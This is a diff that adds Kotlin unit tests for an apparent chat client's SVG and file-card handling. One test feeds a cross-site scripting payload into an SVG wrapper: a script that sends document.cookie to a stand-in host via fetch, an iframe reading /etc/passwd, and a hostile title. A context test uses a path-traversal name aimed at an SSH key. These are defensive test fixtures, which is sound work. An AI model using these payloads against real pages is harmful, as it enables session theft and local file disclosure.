@@ -60,6 +60,36 @@ class ConclaveClientFilesTest {
     }
 
     @Test
+    fun onlyASmallSvgDrawsInTheWebView() {
+        val svg = FileCardData("t", "chart.svg", "image/svg+xml", 1000)
+        assertTrue(FileCards.inlineSvg(svg))
+        assertTrue(FileCards.inlineSvg(svg.copy(size = FileCards.SVG_MAX)))
+        assertFalse(FileCards.inlineSvg(svg.copy(size = FileCards.SVG_MAX + 1)))
+        listOf("text/html", "application/xhtml+xml", "image/png", "text/plain", "application/json", "application/pdf", "").forEach {
+            assertFalse(FileCards.inlineSvg(svg.copy(mediaType = it)), it)
+        }
+    }
+
+    @Test
+    fun theSvgPageHoldsOnlyABase64Image() {
+        val evil = """<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>fetch('https://x.example/'+document.cookie)</script></svg>"></img><script>alert(2)</script><iframe src="file:///etc/passwd">"""
+        val title = """"><script>alert(3)</script><img src=x onerror=alert(4) '"""
+        val doc = FileCards.svgDocument(evil.toByteArray(), title)
+        val data = java.util.Base64.getEncoder().encodeToString(evil.toByteArray())
+        // the bytes appear only as base64, inside the one image's src
+        assertTrue(doc.contains("""src="data:image/svg+xml;base64,$data"></body>"""))
+        assertTrue(Regex("^[A-Za-z0-9+/=]*$").matches(data))
+        assertFalse(doc.contains("<script", ignoreCase = true))
+        assertFalse(doc.contains("<iframe", ignoreCase = true))
+        assertFalse(doc.contains("onload"))
+        assertFalse(doc.contains("file:"))
+        assertFalse(doc.contains("http://") || doc.contains("https://"))
+        assertEquals(1, Regex("<img ").findAll(doc).count())
+        assertTrue(doc.contains("""alt="&quot;&gt;&lt;script&gt;alert(3)&lt;/script&gt;&lt;img src=x onerror=alert(4) &#39;""""))
+        assertTrue(doc.contains("""content="default-src 'none'; img-src data:; style-src 'unsafe-inline'""""))
+    }
+
+    @Test
     fun theCachedCopyStaysInItsFolder() {
         val card = FileCardData("t", "../../.ssh/id ed25519?.txt", "text/plain", 1)
         assertEquals("id ed25519_.txt", FileCards.cacheName(card))
